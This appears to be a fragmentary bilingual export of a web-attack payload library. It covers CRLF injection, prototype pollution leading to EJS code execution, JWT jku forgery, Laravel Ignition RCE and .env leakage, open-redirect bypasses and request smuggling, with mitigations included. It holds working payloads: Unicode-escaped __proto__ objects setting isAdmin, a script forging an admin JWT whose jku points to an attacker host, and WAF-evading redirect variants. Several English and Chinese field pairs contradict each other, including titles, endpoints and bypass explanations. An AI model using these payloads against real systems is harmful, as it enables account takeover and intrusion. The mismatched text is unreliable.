exploitation.zh: 第 1 步把百分号编码与原始 CRLF 变体逐条注入可回显的头值或路径参数，检查响应是否出现注入的 Set-Cookie、自定义头或 Location 指向；出现任一注入结构即确认头注入成立，并区分响应拆分与仅头污染两种深度。成功判据以浏览器实际接受的 Cookie 与响应结构为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, inject percent-encoded and raw CRLF variants one by one into echoable header values or path parameters, checking responses for injected Set-Cookie, custom headers or Location pointers; any injected structure confirms header injection, distinguishing full response splitting from mere header pollution. Judge success by cookies the browser actually accepts and response structure. Replace placeholders via the global variables menu.

mitigation.en: Reject carriage returns in header-bound input with strict encoding, upgrade frameworks to forbid manual multi-header emission, and allowlist redirect Locations. After the fix, replay step 1: every variant should be filtered or rejected.

analysis.zh: 阳性证据是可控 CR/LF 在最终响应分帧前保留，创建一个新的独立 Header 或正文边界，原始字节和浏览器/客户端解析结果一致。 假阳性边界：换行只在日志、JSON 或 HTML 中出现、被 percent 编码返回、框架拆成安全值、代理添加同名 Header、HTTP/2 禁止字段或扫描器猜测均不是注入。
analysis.en: Positive evidence requires controlled CR or LF to survive until final response framing and create a distinct new header or body boundary, with raw bytes matching browser or client parsing. False-positive boundary: Newlines appearing only in logs, JSON, or HTML, percent-encoded output, safe framework splitting, a proxy-added header, HTTP/2 field rejection, or scanner guesses does not prove injection.

review.rationale: WAF4 批次3：按§四 4.8 R1追加 X-Accel-Redirect 内部重定向注入。

name.zh: JavaScript 对象合并原型污染

description.zh: 验证 JSON 或嵌套属性合并是否允许 __proto__ 或 constructor.prototype 改写共享原型，并影响后续授权、DOM 或代码执行 Sink。
description.en: Tests whether JSON or nested-property merging lets __proto__ or constructor.prototype modify a shared prototype and influence later authorization, DOM, or code-execution sinks.

subCategory.zh: 替代语法与查询对象污染

prerequisites.zh: 外部 JSON 或路径键进入不安全 merge/assign，__proto__ 或 constructor.prototype 未被 own-property/schema 校验过滤。
prerequisites.en: External JSON or path keys reach an unsafe merge or assignment where __proto__ or constructor.prototype is not filtered by own-property or schema checks.

prerequisites.zh: 一次性 JavaScript worker 只写唯一 inert marker，并在合并前后记录 Object.prototype、目标构造器和新建对象描述符。
prerequisites.en: A disposable JavaScript worker writes a unique inert marker only and records Object.prototype, target constructors, and new-object descriptors before and after merging.

description.zh: 逐条提交上述 JSON 样例并记录响应与日志差异。命中判据：原型属性被新对象继承并引发预期行为（innerHTML 注入、NODE_OPTIONS 加载等）。
description.en: Prototype Pollution contains multiple reproducible input samples; test them individually and record response and log differences. Success check: the prototype property is inherited and triggers the intended behavior (innerHTML injection, NODE_OPTIONS loading, and so on).

opsecTips.zh: 在一次性隔离 worker 中先以无害哨兵确认污染原语，再逐条验证 isAdmin/innerHTML/env 等 gadget 样例；发现授权变化、DOM 执行、跨请求持久、全局库异常或 worker 不稳定时停止。
opsecTips.en: Prototype-pollution testing never writes business sinks such as isAdmin, innerHTML, or shell; stop on authorization changes, DOM execution, cross-request persistence, global-library anomalies, or worker instability.

opsecTips.zh: 立即销毁污染进程，删除测试对象/marker，清理模块与应用缓存，重启全部隔离 worker 并验证新对象原型恢复。
opsecTips.en: Destroy the polluted process immediately, delete test objects and markers, clear module and application caches, restart all isolated workers, and verify new-object prototypes are restored.

description.zh: 绕过 __proto__ 字面拦截：等价语法污染 Object.prototype。成功判据：全局出现注入属性。
description.en: Bypasses literal __proto__ interception with the equivalent syntax polluting Object.prototype. Success: the injected property appears globally.

description.zh: 分段 Unicode 转义绕过完整 __proto__ 特征但解析后同名。成功判据：解析层命中原型键。
description.en: Segmented Unicode escapes evade the complete __proto__ signature yet resolve to the same key. Success: the parse layer hits the prototype key.

description.zh: 双 __proto__ 键使过滤层取首个丢弃而后个仍被合并。成功判据：任一污染属性生效。
description.en: Duplicate __proto__ keys make the filter drop the first while the second still merges. Success: either polluted property takes effect.

title.zh: qs 深解析污染 EJS 模板编译链
title.en: qs Deep-Parse Pollution to EJS Compile Chain

description.zh: qs 把查询串 __proto__[outputFunctionName] 污染进 Object.prototype，EJS 编译模板时拼接该值形成 RCE（CVE-2021-21362 场景族，express-fileupload 深解析触发）。查询串与既有 JSON 体 gadget 互为互补注入面。成功判据：错误页或响应出现 id 命令输出。
description.en: qs pollutes Object.prototype through the query-string key __proto__[outputFunctionName], and EJS concatenates that value while compiling the template, producing code execution in the CVE-2021-21362 scenario family where express-fileupload deep parsing triggers the merge. The query-string form complements the existing JSON-body gadget on this payload with a distinct injection surface. Success: the error page or response contains the output of the id command.

explanation.zh: qs 深解析把值合并进 Object.prototype
explanation.en: qs deep parse merges the value into Object.prototype

explanation.zh: EJS 编译拼接后的执行 sink
explanation.en: execution sink reached through EJS template compilation

explanation.zh: multipart 上传承载触发渲染的文件
explanation.en: multipart upload carrying the file that triggers rendering

description.zh: 在干净进程中记录空对象、自有属性和递归合并对普通键的预期行为。
description.en: In a clean process, record expected empty-object, own-property, and normal recursive-merge behavior.

description.zh: 提交原始特殊键集合并在新对象上读取唯一 Canary，证明影响不是响应回显。
description.en: Submit the original special-key set and read a unique canary from a new object to prove the effect is not response echo.

attackChain.payload: {"constructor":{"prototype":{"innerHTML":""}}}

description.zh: 分别连接授权、DOM 和进程 Sink，修复特殊键过滤后重启并确认污染与副作用都消失。
description.en: Connect authorization, DOM, and process sinks separately, then restart after special-key filtering and confirm both pollution and side effects disappear.

attackChain.payload:
{"__pro\u0074o\u005f\u005f":{"isAdmin":true}}
{"\u005f\u005fproto\u005f\u005f":{"innerHTML":"PAYLOADER"}}

overview.zh: JavaScript 对象合并原型污染针对 JSON 或嵌套属性合并允许 __proto__ 或 constructor.prototype 改写共享原型的场景。验证 isAdmin、innerHTML、src 与 Node 运行配置等 gadget 链的逐级触发。
overview.en: JavaScript object-merge prototype pollution targets JSON or nested-property merges letting __proto__ or constructor.prototype overwrite the shared prototype. It validates gadget chains—isAdmin, innerHTML, src, and Node runtime configuration—stage by stage.

vulnerability.zh: 易受影响的递归合并、路径赋值或反序列化逻辑未拒绝 __proto__、prototype 和 constructor 等特殊键，导致攻击者把属性写入 Object.prototype 或自定义构造器原型；污染本身与可利用 gadget 是两个独立证据阶段。
vulnerability.en: Vulnerable recursive merges, path assignment, or deserialization logic fail to reject special keys like __proto__, prototype, and constructor, letting attackers write properties to Object.prototype or custom constructor prototypes; pollution itself and exploitable gadgets are two independent evidence stages.

exploitation.zh: 按第 1 步逐条提交样例：先以 isAdmin 变体确认共享原型被改写且目标对象继承该值；再测 innerHTML 与 src 是否进入 DOM 或脚本 Sink；Node 环境测 NODE_OPTIONS 等 gadget。命中判据为继承属性引发预期行为。先证污染原语，再逐个验证 gadget，两级证据分开归档。
exploitation.en: Submit samples one by one per step 1: first confirm with the isAdmin variants that the shared prototype is overwritten and target objects inherit the value; then test whether innerHTML and src reach DOM or script sinks; in Node, test NODE_OPTIONS-style gadgets. A hit is inherited properties producing expected behavior. Prove the pollution primitive first, then verify gadgets one by one, archiving the two evidence stages separately.

mitigation.en: Reject __proto__, prototype, and constructor at every object-path entry; use prototype-less objects, Map, or audited safe merge libraries; read authorization decisions from own properties only with explicit schemas. After the fix, replay all step-1 variants and build separate regression tests for the pollution source and each gadget.

description.zh: 使用仅监听 localhost 的 JWK Set fixture，确认 token 自带 jku 只有在与测试 issuer 的预配置 URL 完全匹配时才可能被解析。
description.en: Uses a localhost-only JWK Set fixture to confirm that token-supplied jku is considered only when it exactly matches the URL preconfigured for the test issuer.

prerequisites.zh: 使用仅监听 127.0.0.1 的 JWT 验证器、合成主体、只读标记接口和专用测试 issuer，记录允许算法、key resolver、issuer、audience 与 token type 配置。
prerequisites.en: Use a JWT verifier bound only to 127.0.0.1, synthetic principals, a read-only marker endpoint, and a dedicated test issuer; record allowed algorithms, key resolver, issuer, audience, and token-type configuration.

prerequisites.zh: (1)已安装 Python 依赖 pyjwt；预先执行 `mkdir -p .payloader-jwt-fixture && openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out .payloader-jwt-fixture/private.pem` 生成 fixture 私钥，导出公钥构造 jwks.json 后在 .payloader-jwt-fixture 目录以 `python3 -m http.server 18080 --bind 127.0.0.1` 托管；仅使用本地生成令牌与该临时 RSA fixture，不得读取生产 token/key、访问远程 jku/x5u 或使用通用密码字典。
prerequisites.en: Use only locally generated tokens, a fixed test HMAC key, or temporary RSA/X.509 fixtures; do not read production tokens or keys, access remote jku/x5u locations, or use general password dictionaries.

title.zh: JWT JKU Key 来源允许列表对照 1
title.en: JWT JKU Key Source Allowlisting Control 1

execution.command:
python3 - <<'PY'
import jwt, time, urllib.error, urllib.request
private_key = open(".payloader-jwt-fixture/private.pem", "rb").read()
token = jwt.encode(
    {"sub":"payloader-negative","iss":"payloader-test","aud":"payloader-api","iat":int(time.time()),"exp":int(time.time())+60},
    private_key,
    algorithm="RS256",
    headers={"typ":"payloader+jwt","kid":"PAYLOADER_LOCAL_KEY","jku":"http://127.0.0.1:18080/jwks.json"},
)
request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization":"Bearer "+token})
try:
    print(urllib.request.urlopen(request, timeout=5).status)
except urllib.error.HTTPError as error:
    print(error.code)
PY
# Expected: reject unless the exact localhost JKU is preconfigured for the test issuer; arbitrary token-supplied URLs are never followed.

description.zh: 在隔离环境执行该JWT JKU Key 来源允许列表对照，只访问 localhost 只读标记，并记录服务端算法、key 与 claim 决策。
description.en: Run this JWT JKU Key Source Allowlisting control in isolation, access only the localhost read-only marker, and record server-side algorithm, key, and claim decisions.

opsecTips.zh: 每个机制最多提交一个有效基线和三个阴性对照；首次出现非 localhost 请求、真实账户、意外 key 读取、状态写入或服务抖动时立即停止。
opsecTips.en: Submit at most one valid baseline and three negative controls per mechanism; stop immediately on any non-localhost request, real account, unexpected key read, state write, or service instability.

opsecTips.zh: 删除临时 token、key、证书、JWKS 与短字典，停止本地 fixture 服务，撤销测试 jti/会话并确认验证器缓存已清空。
opsecTips.en: Delete temporary tokens, keys, certificates, JWKS files, and short dictionaries; stop local fixture services, revoke test jtis and sessions, and confirm verifier caches are cleared.

wafBypass.command:
python3 - <<'PY' 
 import base64, json, rsa 
 (pub, priv) = rsa.newkeys(2048) 
 b = lambda x: base64.urlsafe_b64encode(x).decode().rstrip('=') 
 jwks = {"keys":[{"kty":"RSA","kid":"attacker","n":b(pub.n.to_bytes(256,'big')),"e":"AQAB"}]} 
 open("jwks.json","w").write(json.dumps(jwks))
 hdr = {"alg":"RS256","typ":"JWT","kid":"attacker","jku":"https://{ATTACKER_HOST}/jwks.json"} 
 h = b(json.dumps(hdr, separators=(',',':')).encode()) 
 p = b(b'{"sub":"admin"}') 
 sig = b(priv.sign(f"{h}.{p}".encode(),'SHA-256')) 
 print(f"{h}.{p}.{sig}") 
 PY

description.zh: jku 直指攻击者 JWKS，检验来源域名白名单缺失。成功判据：远程 JWKS 被拉取并采信。
description.en: jku pointing straight at the attacker JWKS tests for missing origin allowlists. Success: the remote JWKS is fetched and trusted.

wafBypass.command:
python3 - <<'PY' 
 import base64, json 
 hdr = {"alg":"RS256","typ":"JWT","kid":"attacker","jku":"https://trusted.example.invalid@{ATTACKER_HOST}/jwks.json"} 
 h = base64.urlsafe_b64encode(json.dumps(hdr, separators=(',',':')).encode()).decode().rstrip('=') 
 p = base64.urlsafe_b64encode(b'{"sub":"admin"}').decode().rstrip('=') 
 print(f"{h}.{p}.ATTACKER_SIGNATURE") 
 PY

description.zh: jku 前缀白名单绕过 — 字符串前缀白名单只比对 URL 开头：@ 前的可信域被解析为用户信息，实际取钥主机为攻击者域。成功判据：取钥请求到达攻击者域。
description.en: Traversal segments pass prefix allowlists while the actual key fetch hits the attacker. Success: the key fetch reaches the attacker domain.

description.zh: 重复 jku 键使白名单层取可信值、取钥层取攻击者值。成功判据：攻击者 JWKS 完成验签。
description.en: Duplicate jku keys let the allowlist layer see trusted while the fetch layer sees attacker. Success: the attacker JWKS satisfies verification.

description.zh: 白名单校验与实际拉取发生两次 DNS 解析，低 TTL 重绑定域名使首解命中可信域、二解命中攻击者域，绕过"拉取前校验域名"的允许列表。成功判据：JWKS 拉取落在攻击者域且令牌通过验签。
description.en: Whitelist validation and the actual JWKS fetch resolve DNS twice; a low-TTL rebinding hostname answers the first lookup from the trusted zone and the second from the attacker zone, defeating allowlists that check the hostname before pulling. Success: the JWKS fetch lands on the attacker host and the token passes signature verification.

explanation.zh: 重绑定域名承载 JWKS 地址，两次解析指向不同主机

description.en: Correlate algorithm selection, key resolver, claim validation, HTTP status, and final principal, excluding token generation or decoding as false positives.

overview.zh: 该 Payload 覆盖 JWT jku 密钥来源允许列表场景，检验验证器是否只在 jku 与测试签发方预配置 URL 完全匹配时才解析。验证维度为本地监听 JWK Set 夹具与错配 URL 的对照单步执行，对应第 1 步。
overview.en: This payload covers the JWT jku key-source allowlist, testing whether the verifier resolves jku only on exact matches with the test issuer's preconfigured URL. Validation contrasts a locally served JWK Set fixture with mismatched URLs in one step, mapped to step 1.

vulnerability.zh: 根因在于验证器跟随令牌 jku 指向的任意地址下载密钥：攻击者托管自有 JWK Set 并在头部声明，服务端即用攻击者密钥完成验证，签名信任被架空。
vulnerability.en: The root cause is the verifier downloading keys from any jku address the token names: attackers host their own JWK Set, declare it in the header, and the server verifies with attacker keys, voiding signature trust.

exploitation.zh: 第 1 步执行脚本以本地 fixture 私钥签发携带 jku 的令牌（jku 指向本地 18080 端口，可替换为预配置 URL 之外的错配地址再签发对照）并提交，记录服务端解析决策：仅预配置 URL 被解析而其余拒绝即证明允许列表生效，错配 URL 也被拉取即确认信任缺陷。成功判据以 key 来源日志为准。占位符在全局变量菜单替换；本地夹具仅监听 localhost。
exploitation.en: In step 1, run the script to sign tokens with the local fixture private key carrying jku values aimed at the preconfigured URL and mismatched URLs, submitting each and recording resolution decisions; only the preconfigured URL being fetched with the rest rejected proves the allowlist, while mismatched URLs also being pulled confirms the trust flaw. Judge success by key-source logs. Replace placeholders via the global variables menu; the local fixture listens on localhost only.

mitigation.en: Resolve jku only on exact equality with the issuer-preconfigured URL, disable redirect following, and validate response origin. After the fix, replay step 1: every mismatched URL should be rejected.

analysis.zh: 本条聚焦JWT JKU 与 X5U Key 来源边界。阳性必须表现为 localhost 验证器在错误算法、错误 key 来源或错误 claim 条件下仍建立了错误主体并读取同一只读标记，同时由验证器日志确认具体分支。解码成功、令牌可生成、key 文件存在、工具退出码、HTTP 200 错误页或客户端显示 claim 都不是绕过证据。
analysis.en: This entry focuses on JWT JKU and X5U Key Source Boundaries. A positive result requires the localhost verifier to establish the wrong principal and read the same read-only marker under a wrong algorithm, key source, or claim condition, with verifier logs identifying the branch. Successful decoding, token generation, key-file presence, tool exit status, an HTTP 200 error page, or client-visible claims do not prove bypass.

name.zh: Laravel 配置与反序列化回归

description.zh: 覆盖 Laravel 框架漏洞利用链验证：从 Ignition CVE-2021-3129 RCE 与 PHPGGC 生成框架利用链，到 .env 配置泄露读取，再到 Tinker 加密数据解密，用于确认配置暴露与反序列化风险。
description.en: Covers Laravel exploit-chain validation: from Ignition CVE-2021-3129 RCE and PHPGGC-generated framework chains through .env configuration leak reads to Tinker decryption of encrypted data, confirming configuration exposure and deserialization risk.

prerequisites.zh: 确认 Laravel 配置与反序列化回归 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Laravel Configuration and Deserialization Regression are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

description.en: Front-controller differential on Laravel: when /_ignition/execute-solution is blocked by literal rules, /index.php/_ignition/execute-solution routes through the same front controller to the same controller, and comparing the status codes of the direct and front-controller forms evidences the bypass. Success: the direct form returns 403 or 404 while the front-controller form reaches the application route. The viewFile carries a harmless data text so the pair only validates route reachability.

overview.zh: Laravel 配置与反序列化回归针对 Laravel 部署暴露与反序列化入口的组合场景。覆盖 Ignition CVE-2021-3129 RCE、PHPGGC 框架链生成、.env 配置泄露与 Tinker 解密四类验证维度。
overview.en: The Laravel configuration and deserialization regression targets combined scenarios of Laravel deployment exposure and deserialization entries. It covers four verification dimensions: Ignition CVE-2021-3129 RCE, PHPGGC framework-chain generation, .env configuration leakage, and Tinker decryption.

vulnerability.zh: 根因有两类：Ignition 错误页在调试模式暴露时允许通过 phar:// 流触发文件包含；.env 直接回源则泄露 APP_KEY，持有密钥即可伪造签名并解密 Laravel 加密数据，反序列化入口配合 PHPGGC 链升级为命令执行。
vulnerability.en: There are two root causes: the Ignition error page, when exposed in debug mode, allows file inclusion via phar:// streams; and a directly served .env leaks APP_KEY, enabling signature forgery and decryption of Laravel-encrypted data, while a deserialization entry combined with PHPGGC chains escalates to command execution.

exploitation.zh: 按 Payload 列表顺序使用：先按第 3 步请求 /.env 等路径，返回 APP_KEY 即配置泄露；再用第 1 步脚本对 /_ignition/execute-solution 触发 phar:// 包含实现 RCE；有反序列化入口时用第 2 步 phpggc 生成 Laravel/RCE1、RCE2、RCE4、RCE5、RCE9 链逐条投递；第 4 步在 tinker 中解密泄露数据。被拦截时改用路径变形枚举 .env。
exploitation.en: Use payloads in list order: request /.env and siblings per step 3—a returned APP_KEY is configuration leakage; then trigger phar:// inclusion for RCE against /_ignition/health-check with step 1's script; with a deserialization entry, generate and deliver the Laravel/RCE1, RCE2, RCE4, RCE5, RCE9 chains via step 2's phpggc one by one; step 4 decrypts leaked data in tinker. If blocked, use path-variant .env enumeration.

mitigation.zh:
生产关闭调试、移除 Ignition（或升级修复 CVE-2021-3129 的 2.5.2+），Web 根仅指向 public 使 .env 不可回源；轮换已泄露的 APP_KEY 并重加密数据、升级依赖。
    # .env
    APP_ENV=production
    APP_DEBUG=false
    # Nginx：拒绝敏感文件回源
    location ~ /\.(env|git) { deny all; return 404; }
    composer remove facade/ignition --dev
mitigation.en: Disable debug in production and remove the /_ignition route, point the web root at public so .env cannot be fetched, rotate any exposed APP_KEY, and re-encrypt data; upgrade Laravel and dependencies. After the fix, replay steps 1 and 3 and confirm the error page and .env are unreachable while the app works normally.

analysis.zh: Laravel 配置与反序列化回归只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Laravel Configuration and Deserialization Regression is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

name.zh: 基础开放重定向目标解析

description.zh: 使用本地 Fixture 和 `.invalid` 保留域名验证绝对 URL、userinfo、协议相对形式、百分号编码与反斜杠规范化后的最终目标。
description.en: Use a local fixture and the reserved .invalid domain to validate final destinations after parsing absolute URLs, userinfo, protocol-relative forms, percent encoding, and backslashes.

prerequisites.zh: 使用 127.0.0.1 重定向 Fixture，并关闭客户端自动跟随以便保存原始 Location。
prerequisites.en: Use the 127.0.0.1 redirect fixture and disable automatic following so the original Location is preserved.

prerequisites.zh: 外部目标统一使用 {ATTACKER_HOST} 占位符，实验内固定替换为 redirect-canary.invalid 保留域；该域名不解析也不承载任何服务。
prerequisites.en: Use only redirect-canary.invalid as the external destination; the test domain does not resolve or host a service.

description.zh: 请求携带外部 next 参数的跳转链接；响应 302 且 Location 与浏览器最终地址落在 next 指定的外部域，即确认开放重定向。
description.en: Request the redirect link with an external next parameter; a 302 whose Location and final browser address land on the external domain confirms an open redirect.

description.zh: 以合法域@外部域形式构造 next；目标被解析为 @ 之后的 host 并完成跳转，即确认 authority 解析绕过。
description.en: Craft next as legit-domain@external-domain; if the target resolves to the host after @ and the redirect fires, authority parsing is bypassed.

explanation.en: Describes how the value segment "attacker.com@target.com" participates in this validation command.

description.zh: 以协议相对 //外部域 构造 next；跳转落在外部域，即确认仅校验路径前缀的实现可被绕过。
description.en: Craft next as a protocol-relative //external-domain; if navigation lands on the external domain, path-prefix-only validation is bypassed.

opsecTips.zh: 所有外部目标使用 `.invalid` 保留域名，关闭自动跟随并避免第三方网络流量。
opsecTips.en: Use the reserved .invalid domain for every external destination, disable automatic following, and avoid third-party network traffic.

opsecTips.zh: 每次只改变一个 URL 变量并保存原始字节，防止代理、框架或浏览器二次编码造成误判。
opsecTips.en: Change one URL variable per request and preserve raw bytes to avoid misattributing proxy, framework, or browser re-encoding.

title.en: Validation step 1 for Basic Open-Redirect Destination Parsing

description.zh: 提交 URL 编码与双编码等编码变体；编码后的外部目标仍触发 302 跳转，即确认白名单在解码前匹配。
description.en: Submit encoded and double-encoded variants; if the encoded external target still triggers the 302, the allowlist matches before decoding.

title.en: Validation step 2 for Basic Open-Redirect Destination Parsing

description.zh: 提交反斜杠与 data: 等解析变体；任一变体使浏览器最终落地外部域，即确认跨解析器校验差异可被利用。
description.en: Submit backslash and data: parsing variants; any variant that lands the browser on the external domain confirms exploitable cross-parser differences.

title.zh: 协议相对斜杠回归样例

description.zh: 提交协议相对 // 形式目标；跳转落在外部域，即确认路径前缀校验被绕过。
description.en: Submit the protocol-relative // form; if the redirect lands on the external domain, path-prefix validation is bypassed.

description.zh: 提交 %23 与 @ 组合的片段混淆目标；服务端校验取片段前内容而浏览器跳到 @ 之后的 host，即确认片段解析差异可利用。
description.en: Submit the fragment-confused target combining %23 and @; server validation reading pre-fragment content while the browser lands on the post-@ host confirms an exploitable parsing differential.

title.zh: 双编码 CRLF 注入变体
title.en: Null byte and special character truncation

description.zh: 提交双编码 CRLF 目标；响应头出现注入的 X-Lab-Marker，即确认 CRLF 注入可绕过目标校验。失效条件：现代服务器一律拒绝头部值中的 CR/LF，仅旧嵌入式或自研 HTTP 栈有效；双编码形态另需网关二次解码架构成立。
description.en: Submit the double-encoded CRLF destination; an injected X-Lab-Marker appearing in response headers confirms CRLF injection past destination validation. Failure condition: modern servers reject CR/LF inside header values outright, so only old embedded or hand-rolled HTTP stacks are exposed, and the double-encoded form additionally requires a double-decoding gateway.

title.en: Validation step 1 for Percent-Encoded Open-Redirect Bypass

description.zh: 把百分号编码目标逐条提交；解码后仍跳转到外部域，即确认编码规范化绕过。
description.en: Submit each percent-encoded destination; redirects to the external domain after decoding confirm the encoding-normalization bypass.

description.zh: 提交 URL 编码的外部目标；解码后仍发生跳转且落在外部域，即确认编码绕过有效。
description.en: Submit the URL-encoded external destination; if decoding still redirects to the external domain, the encoding bypass works.

description.zh: 原命令与 execution 逐字相同、无任何变形。本变体将 @ 编码为 %40（第二行整段 URL 全编码），绕过对原始 @ 字符的字面检测，解析器仍按 userinfo 语义把 {TARGET} 当作用户信息、以 {ATTACKER_HOST} 为真实主机完成跳转。成功判据：跳转落在攻击者域。
description.en: The original line duplicated the execution sample verbatim. Percent-encoding the @ (and fully encoding the whole URL on the second line) evades literal @-detection while the parser still treats {TARGET} as userinfo and navigates to {ATTACKER_HOST}. Success: the redirect lands on the attacker-controlled domain.

explanation.zh: @ 的百分号编码形态，绕过字面检测
整段全编码 URL，对抗对明文 URL 特征的拦截
explanation.en: fully encoded URL defeats plaintext URL pattern matching

description.zh: 提交反斜杠分隔的目标；任一解析器接受并跳转，即确认反斜杠规范化差异可利用。
description.en: Submit the backslash-separated destination; acceptance and redirection by any parser confirms exploitable backslash-normalization differences.

explanation.zh: 反斜杠被部分解析器规范化为 /，形成协议相对 URL 绕过 host 校验
explanation.en: The backslash is normalized to / by some parsers, forming a protocol-relative URL that bypasses host validation

description.zh: WHATWG 解析把多余斜杠折叠，///host 等价 //host；以 // 开头为特征的拦截常漏三斜杠与四斜杠形态。成功判据：跳转至攻击者域。失效条件：校验先折叠斜杠再做协议相对判断。
description.en: WHATWG URL parsing folds redundant slashes, making the triple-slash form equivalent to the protocol-relative double-slash; blocks keyed on the leading // marker commonly miss the three- and four-slash variants. Success: the browser navigates to the attacker host. Failure condition: validation folds slashes first and then applies the protocol-relative check.

explanation.zh: 三斜杠折叠为协议相对形式
explanation.en: three slashes fold into the protocol-relative form

explanation.zh: 四斜杠同样被折叠，验证折叠层数
explanation.en: four slashes fold as well, probing the folding depth

description.zh: 使用固定相对路径记录正常状态码与 Location，确认重定向端点的预期行为。
description.en: Use a fixed relative path to record normal status and Location and confirm expected endpoint behavior.

attackChain.payload: http://127.0.0.1:18080/lab/redirect?next=https://{ATTACKER_HOST}/basic-a1

title.en: Submit destination variants one at a time

description.zh: 依次改变 userinfo、协议相对形式、编码和反斜杠，保持端点与身份不变。
description.en: Change userinfo, protocol-relative form, encoding, and backslashes separately while holding endpoint and identity constant.

description.zh: 对照应用日志、Location 与浏览器解析，确认最终 scheme、host 和 port 是否仍受批准。
description.en: Compare application logs, Location, and browser parsing to confirm that final scheme, host, and port remain approved.

description.zh: 修复后重放五个样例，要求外域全部拒绝或转换为批准的同源路径。
description.en: Replay all five samples after remediation and require every external destination to be rejected or mapped to an approved same-origin path.

overview.zh: 该 Payload 覆盖开放重定向的基础目标解析场景，检验跳转端点对 next 参数的绝对 URL、userinfo、协议相对与编码变体的校验是否可靠。验证维度含直接外部跳转、@ 混淆与协议相对斜杠三类样例，对应第 1 至第 3 步。
overview.en: This payload covers basic open-redirect target parsing, testing whether the redirect endpoint reliably validates absolute URLs, userinfo, protocol-relative and encoded variants of the next parameter. Validation covers direct external redirects, userinfo confusion, and protocol-relative slashes, mapped to steps 1 through 3.

vulnerability.zh: 根因在于重定向目标校验基于字符串包含或前缀匹配而非解析后的 host：合法域出现在 userinfo 位置或以双斜杠开头的协议相对 URL 都能伪装为站内目标，最终跳转到外部域。
vulnerability.en: The root cause is validation by substring or prefix matching instead of parsing the host: a legitimate domain in the userinfo position or a protocol-relative URL starting with double slashes masquerades as an in-site target and ends at an external domain.

exploitation.zh: 第 1 步请求携带外部 next 的链接，响应 302 且最终落在外部域即确认开放重定向；第 2 步以合法域@外部域构造 next，authority 落在 @ 后主机即确认 userinfo 绕过；第 3 步以双斜杠外部域提交，跳转落地外部域即确认前缀校验失效。以 Location 与最终地址为判据。占位符在全局变量菜单替换；编码变体参考 wafBypass。
exploitation.en: In step 1, request the link with an external next; a 302 landing externally confirms the open redirect. In step 2, craft next as legitimate-domain-at-external-domain; authority resolving to the post-at host confirms the userinfo bypass. In step 3, submit the double-slash external form; external landing confirms the failed prefix check. Use Location and final address as criteria. Replace placeholders via the global variables menu; see wafBypass for encoding variants.

mitigation.en: Parse the URL before redirecting and match the authority exactly against a pre-registered domain allowlist, permitting only in-site relative paths or allowlisted targets. After the fix, replay steps 1 through 3: every external target should be rejected or fall back to the home page.

analysis.zh: 阳性证据是最终解析的 scheme、host 或 port 离开明确允许列表，并由 Location 或浏览器导航确认。参数中出现外域、应用返回重定向状态或日志记录告警都只能作为线索。
analysis.en: Positive evidence is a final parsed scheme, host, or port outside the explicit allowlist, confirmed by Location or browser navigation. An external domain in the parameter, a redirect status, or a log warning is only a lead.

name.zh: CL.CL 请求走私

description.zh: 验证前后端对重复 Content-Length 请求的处理是否一致，防止 CL.CL 解析分歧被用于请求走私。
description.en: Verifies that the front end and back end consistently reject requests with duplicate Content-Length headers, preventing CL.CL parsing divergence from being used for request smuggling.

prerequisites.zh: 确认 HTTP 重复 Content-Length 拒绝回归 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for HTTP Duplicate Content-Length Rejection Regression are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

title.zh: 重复 Content-Length 原始请求

description.zh: 命令以原始 TCP（nc）发送，避免 curl 等客户端改写报文，且只请求授权实验 echo 路径；按 RFC 9112，前后端都应拒绝携带不同 Content-Length 的请求。
description.en: Use a raw TCP request instead of curl, which may rewrite the message, and target only an authorized lab echo path. RFC 9112 expects both hops to reject differing Content-Length values.

description.zh: 保留完整双请求边界样例，但把管理路径与通用目标替换为单用户授权 echo 夹具；只依据两跳请求计数和日志判定。
description.en: Retain a complete dual-request boundary sample while replacing administrative and generic targets with a single-user authorized echo fixture. Judge only by request counts and logs at both hops.

title.zh: CL-CL 持久连接边界样例

description.zh: 保留持久连接上的第二请求结构，但只命中授权 echo 路径，不再演示 ACL 绕过；阳性要求代理与后端日志证明请求数量分歧。
description.en: Retain the second-request structure on a persistent connection while targeting only an authorized echo path rather than demonstrating an ACL bypass. A positive result requires proxy and backend logs proving a request-count disagreement.

opsecTips.zh: 重复 Content-Length 会触发中间件告警——串行单发并在每发后核对队列状态；不对生产链路发送。
opsecTips.en: Duplicate Content-Length trips middleware alerts — send serially one at a time, check queue state between attempts, and never target production chains.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.zh: 保留 HTTP/2 到 HTTP/1.1 降级前提，但只使用实验 echo 路径和固定正文；必须由网关与后端日志证明降级后的边界差异。
description.en: Retain the HTTP/2-to-HTTP/1.1 downgrade prerequisite while using only a lab echo path and fixed body. Gateway and backend logs must prove a post-downgrade boundary difference.

title.zh: 不同 CL 值持久连接变体

description.zh: 保留两个不同 Content-Length 与后续请求结构，改用授权 echo 路径；单次响应状态不能证明走私，需比较两跳解析日志。
description.en: Retain two differing Content-Length values and the following-request structure on authorized echo paths. One response status cannot prove smuggling; compare parsing logs at both hops.

title.zh: CL 头部空白解析变体

